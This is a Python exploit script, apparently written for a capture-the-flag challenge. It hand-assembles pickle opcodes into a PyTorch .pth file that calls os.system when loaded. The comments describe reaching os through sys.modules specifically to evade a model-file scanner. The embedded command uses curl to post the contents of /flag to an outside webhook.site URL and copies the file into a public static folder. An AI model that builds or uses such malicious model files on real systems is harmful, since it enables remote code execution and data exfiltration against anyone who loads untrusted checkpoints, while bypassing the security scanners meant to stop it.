import pickle
import zipfile
import io
import torch

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# V13: sys.modules['os'].system 绕过
# 扫描器似乎拦截了 'platform.popen'。
# 我们尝试直接从 sys.modules 获取 'os'，而不直接 IMPORT 它。
# 如果 os 已经被加载（通常都是），我们可以通过 sys.modules['os'] 拿到它。
#
# Opcode logic:
# 1. GET sys.modules (dict)
#    STACK_GLOBAL 'sys' 'modules'
# 2. CALL dict.get(sys.modules, 'os') -> os module
#    Target: sys.modules.get('os')
#    How to call method on object in stack?
#    Use REDUCE with a bound method? Or use getattr(obj, 'get')?
#
#    STACK_GLOBAL 'builtins' 'getattr'
#    STACK_GLOBAL 'sys' 'modules'
#    PUSH 'get'
#    REDUCE (getattr(sys.modules, 'get')) -> method
#    PUSH 'os'
#    REDUCE (method('os')) -> os module
#
# 3. GET os.system
#    STACK_GLOBAL 'builtins' 'getattr' (optimize: use MEMO to store getattr?)
#    (OS_MODULE from step 2)
#    PUSH 'system'
#    REDUCE -> system function
#
# 4. CALL system(CMD)
#    PUSH CMD
#    TUPLE1
#    REDUCE

STACK_GLOBAL = b'\x93'
GLOBAL = b'c'
REDUCE = b'R'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'
GET = b'g' # get from memo
PUT = b'p' # put to memo

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

def push_int(i):
    # simple byte push for small ints
    return b'K' + i.to_bytes(1, 'little')

pkl = b'\x80\x02'

# 1. 获取 builtins.getattr 并存入 Memo 0
pkl += push_str('builtins')
pkl += push_str('getattr')
pkl += STACK_GLOBAL
pkl += b'q\x00' # PUT 0

# 2. 获取 sys.modules
pkl += push_str('sys')
pkl += push_str('modules')
pkl += STACK_GLOBAL

# 3. 获取 sys.modules.get
# STACK: [sys.modules]
# CALL getattr(sys.modules, 'get')
pkl += b'h\x00' # GET 0 (getattr)
# STACK: [sys.modules, getattr] -> WRONG order for reduce.
# REDUCE expects (func, args_tuple)
# We need to structure it: (getattr, (sys.modules, 'get'))
# But we have sys.modules on stack.
# 
# Let's adjust:
# Just prepare args tuple first
pkl += b'h\x00' # getattr
pkl += push_str('sys')
pkl += push_str('modules')
pkl += STACK_GLOBAL # sys.modules
pkl += push_str('get')
pkl += TUPLE2
pkl += REDUCE # getattr(sys.modules, 'get') -> sys.modules.get method

# 4. 获取 os 模块
# CALL sys.modules.get('os')
pkl += push_str('os')
pkl += TUPLE1
pkl += REDUCE # sys.modules.get('os') -> os module

# 5. 获取 os.system
# CALL getattr(os_module, 'system')
# Currently stack top: os_module
# We need: (getattr, (os_module, 'system'))
#
# We need to construct tuple (os_module, 'system') but os_module is on stack.
# Can we use 'stack' opcode? No.
# We can use memo to save os_module.
pkl += b'q\x01' # PUT 1 (os module)

pkl += b'h\x00' # getattr
pkl += b'h\x01' # os module
pkl += push_str('system')
pkl += TUPLE2
pkl += REDUCE # os.system

# 6. 调用 os.system(CMD)
pkl += push_str(CMD)
pkl += TUPLE1
pkl += REDUCE

pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v13.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v13.pth (sys.modules['os'])")
